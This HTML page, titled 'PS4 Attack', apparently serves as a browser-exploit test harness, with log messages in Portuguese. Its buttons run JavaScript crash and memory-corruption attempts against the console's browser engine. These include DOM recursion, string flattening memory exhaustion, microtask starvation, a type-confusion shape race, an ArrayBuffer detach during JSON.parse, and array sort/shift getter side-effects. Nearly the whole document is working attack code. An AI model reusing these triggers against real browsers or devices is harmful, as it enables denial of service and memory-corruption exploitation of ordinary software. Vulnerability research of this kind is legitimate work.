<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
   <title>PS4 Attack</title>
   </head>
<body>

  <h1>ATTACK SUITE 2</h1>

    <button onclick="startDOMRecursion()">HACKERONE TRIGGER CRASH</button>
    <button onclick="runStringAttack()">HACKERONE STRING FLATTENING</button>
	
    <button onclick="runArrayShift()">PROMISSOR Array Shift Fast-Path Bailout</button>
	<button onclick="runBindChain()">PROMISSOR Function.bind() Chain Reaction</button>
	<button onclick="runCollationCrash()">PROMISSOR Locale Collation Stack Smash</button>
    <button onclick="runUnwindSmash()">PROMISSOR Exception Unwinder Stack Smash</button>
    <button onclick="runZombieWindow()">PROMISSOR Zombie Iframe Access</button>
	<button onclick="run10_CSSNth()">PROMISSOR CSS nth-child() Recursion</button>
    <button onclick="runShapeShift()">PROMISSOR Object Shape Transition Race (Type Confusion)</button>
    <button onclick="runGCReentrancy()">PROMISSOR Array Buffer Detach via GC Side-Effect</button>
	<button onclick="runSortSideEffect()">PROMISSOR Array Sort Side-Effect (qsort)</button>

    <button onclick="runMicrotaskBomb()">MEMORIA Promise Microtask Starvation</button>
	<button onclick="runReplaceBomb()">MEMORIA String.replace Calculation Overflow</button>
    <button onclick="run10_AllocPanic()">MEMORIA Bad Array New Length</button>
    <button onclick="runBadArrayLength()">MEMORIA Bad Array Length (Integer Overflow)</button>
	
    <div id="log">Status: Aguardando testes...</div>
    <canvas id="c" width="100" height="100"></canvas>
    
    <div id="hidden-area" style="display:none;"></div>
    <div id="font-area" style="font-family: sans-serif;"></div>
    <canvas id="c_src" width="100" height="100" style="display:none;"></canvas>
    <canvas id="c_dst" width="100" height="100" style="display:none;"></canvas>
    <div id="sandbox" style="display:none;"></div>
    <div id="ax-root"></div>
    <div id="box" style="width:100px; height:100px; background:red; display:none;"></div>

    <script>
        function log(msg) { 
            // Atualiza o log preservando o texto anterior no topo ou append
            // Ajustado para o padrão encontrado no seu código original
            let logElem = document.getElementById('log');
            logElem.innerText = `> ${msg}\n` + logElem.innerText;
        }

        // --- HACKERONE FUNCTIONS ---

        function startDOMRecursion() {
            log("Iniciando ataque de Profundidade DOM...");
            setTimeout(() => {
                try {
                    let root = document.createElement('div');
                    document.body.appendChild(root);
                    let count = 0;
                    
                    function dive() {
                        count++;
                        let child = document.createElement('div');
                        child.innerText = "."; 
                        root.appendChild(child);
                        root = child; 
                        
                        if (count % 1000 === 0) log(`Profundidade atual: ${count}`);
                        
                        dive(); 
                    }
                    dive();
                } catch (e) {
                    log("Erro capturado (Browser tentou proteger): " + e);
                    log("Tentando método alternativo (String Repeat)...");
                    document.body.innerHTML = "<div>".repeat(20000) + "</div>".repeat(20000);
                }
            }, 500);
        }

        function runStringAttack() {
            log("Fase 1: Criando Array Fragmentado...");
            setTimeout(() => {
                try {
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); 
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    var flatString = hugeArray.join("");
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); 
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }

        // --- MEMORIA FUNCTIONS ---

	    function runBadArrayLength() {
            log("Testando Array Length Integer Overflow...");
            const sizes = [
                0xFFFFFFFF, 0x80000000, 0x7FFFFFFF, -1, 4294967295, 4294967296 
            ];
            sizes.forEach(size => {
                try {
                    log(`Tentando alocar Uint8Array(${size})...`);
                    let arr = new Uint8Array(size);
                    log("Alocado (Inesperado!)");
                } catch(e) {}
            });
            log("Teste de Array finalizado.");
        }

        function runMicrotaskBomb() {
            log("Iniciando Microtask Starvation (IPC Freeze)...");
            log("Aviso: A aba vai congelar. Observe o comportamento do botão PS.");
            let count = 0;
            function loop() {
                count++;
                Promise.resolve().then(loop);
                if (count % 100000 === 0) {
                    new Date().toString(); 
                }
            }
            loop();
        }

        function runReplaceBomb() {
            log("Armando String.replace Logic Bomb...");
            try {
                let str = "test";
                const re = /.*/; 
                for(let i=0; i<30; i++) { 
                    str = str.replace(re, "$&".repeat(2)); 
                    if (i % 5 === 0) log(`Nível ${i}: Length ~${str.length}`);
                }
                log("String final gerada (Seguro).");
            } catch(e) {
                log("Erro Replace (Provável OOM): " + e.message);
            }
        }

        function run10_AllocPanic() {
            log("[10] Testing Allocator Panic...");
            try {
                const arr = new ArrayBuffer(2147483647); // Max 32-bit signed
                log("Allocated (Unexpected).");
            } catch(e) { log("Alloc Error (Expected): " + e.message); }
        }

        // --- PROMISSOR FUNCTIONS ---

        function runArrayShift() {
            log("Testando Array Fast Path Bailout...");
            try {
                const arr = [1, 2, 3, 4];
                Object.defineProperty(arr, '2', {
                    get: function() {
                        log("Getter acionado durante shift! Destruindo array...");
                        arr.length = 0; 
                        arr.push(0x41414141); 
                        return "GATILHO";
                    }
                });
                log("Executando shift()...");
                arr.shift();
                log("Operação concluída. Array length: " + arr.length);
                log("Valor [0]: " + arr[0]);
            } catch(e) {
                log("Erro Array: " + e.message);
            }
        }

        function runBindChain() {
            log("Criando cadeia Function.bind()...");
            try {
                let func = function() { return "pow"; };
                for (let i = 0; i < 50000; i++) {
                    func = func.bind(null);
                }
                log("Cadeia criada. Executando (Trigger)...");
                func();
                log("Bind Chain executada (Sem crash).");
            } catch(e) {
                log("Erro Bind: " + e.message);
                if (e.message.includes("stack")) {
                    log("SUCESSO: Stack Overflow via Bind Chain!");
                }
            }
        }

        function runCollationCrash() {
            log("Iniciando Collation Stack Smash...");
            try {
                const strA = "\u0301".repeat(50000); 
                const strB = "\u0301".repeat(50001);
                log("Comparando strings complexas (50k chars)...");
                const result = strA.localeCompare(strB, "de-DE-u-co-phonebk", {
                    sensitivity: "variant",
                    usage: "sort"
                });
                log("Comparação concluída: " + result);
            } catch(e) {
                log("Erro Collation: " + e.message);
            }
        }

        function runUnwindSmash() {
            log("Testando 'libunwind' Stack Limits...");
            function recursiveThrow(depth) {
                try {
                    if (depth > 0) {
                        recursiveThrow(depth - 1);
                    } else {
                        throw new Error("Start Unwind");
                    }
                } catch(e) {
                    try {
                        decodeURIComponent("%".repeat(1000)); 
                    } catch(err2) {
                        throw new Error("Nested: " + err2.message); 
                    }
                }
            }
            try {
                recursiveThrow(4000);
                log("Unwind completado com segurança.");
            } catch(e) {
                log("Erro capturado no topo: " + e.message.substring(0, 50));
                if (e.message.includes("Stack")) log("ALERTA: Stack Overflow detectado!");
            }
        }

        function runZombieWindow() {
            log("Criando Janela Zumbi...");
            const ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            const win = ifr.contentWindow;
            document.body.removeChild(ifr);
            log("Iframe removido. Acessando propriedades mortas...");
            setTimeout(() => {
                try {
                    const h = win.history; 
                    log("History acessado (Type: " + typeof h + ")");
                    win.location.href = "about:blank"; 
                    log("Navegação solicitada em zumbi.");
                } catch(e) {
                    log("Acesso bloqueado (Seguro): " + e.message);
                }
            }, 100);
        }

        function run10_CSSNth() {
            log("[10] CSS nth-child Logic...");
            const s = document.createElement('style');
            s.textContent = "div:nth-last-child(2n+1) { color: red }";
            document.head.appendChild(s);
            const root = document.createElement('div');
            for(let i=0; i<2000; i++) {
                root.appendChild(document.createElement('div'));
            }
            document.getElementById('sandbox').appendChild(root);
            const h = root.offsetHeight;
            log("CSS Recalc Safe.");
            document.head.removeChild(s);
            document.getElementById('sandbox').innerHTML = "";
        }

        function runShapeShift() {
            log("[1] Iniciando Shape Shift Attack...");
            const arr = [1.1];
            const objArr = [{}];
            function victim(a, p) { return a[0]; }
            for(let i=0; i<10000; i++) victim(arr);
            for(let i=0; i<10000; i++) victim(objArr);

            const target = [1.1, 2.2];
            Object.defineProperty(target, "0", {
                get: () => {
                    target[1] = {}; 
                    return 0x41414141; 
                }
            });
            try {
                log("Executando acesso corrompido...");
                const res = victim(target);
                log("Resultado: " + res);
                if (res === 1.1) log("Sem corrupção.");
                else log("ALERTA: Leitura inconsistente detectada!");
            } catch(e) { log("Erro Shape: " + e.message); }
        }

        function runGCReentrancy() {
            log("[2] Armando GC Reentrancy Trap...");
            const buffer = new ArrayBuffer(1024 * 1024); 
            const view = new Uint8Array(buffer);
            const jsonString = '{"a": 1, ' + '"b": [1], '.repeat(5000) + '"c": 2}';
            let count = 0;
            try {
                JSON.parse(jsonString, (key, value) => {
                    if (key === "") return value; 
                    count++;
                    if (count === 2000) {
                        log("Trigger point! Forçando GC e Detach...");
                        try {
                            const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/js"})));
                            w.postMessage(buffer, [buffer]);
                            w.terminate();
                        } catch(e) {}
                        const trash = [];
                        for(let i=0; i<10000; i++) trash.push(new Array(100).join("X"));
                    }
                    return value;
                });
                log("Parse concluído. Verificando buffer...");
                if (buffer.byteLength === 0) {
                    log("Buffer está neutrado (Safe). Tendo acesso: " + view[0]);
                } else {
                    log("Buffer ainda vivo (Strange).");
                }
            } catch(e) {
                log("Erro Crítico: " + e.message);
            }
        }

        function runSortSideEffect() {
            log("Iniciando Ataque qsort() Side-Effect...");
            try {
                const arr = new Array(2000).fill(0).map((_, i) => i);
                arr.sort((a, b) => {
                    if (a === 1000 || b === 1000) {
                        log("Gatilho acionado! Alterando tamanho do array...");
                        arr.length = 1; 
                        let junk = new Array(1000).fill(1.1);
                        return 0;
                    }
                    return a - b;
                });
                log("Sort finalizado. Tamanho final: " + arr.length);
            } catch(e) {
                log("Erro Sort (Proteção Ativa?): " + e.message);
            }
        }

    </script>
</body>
</html>

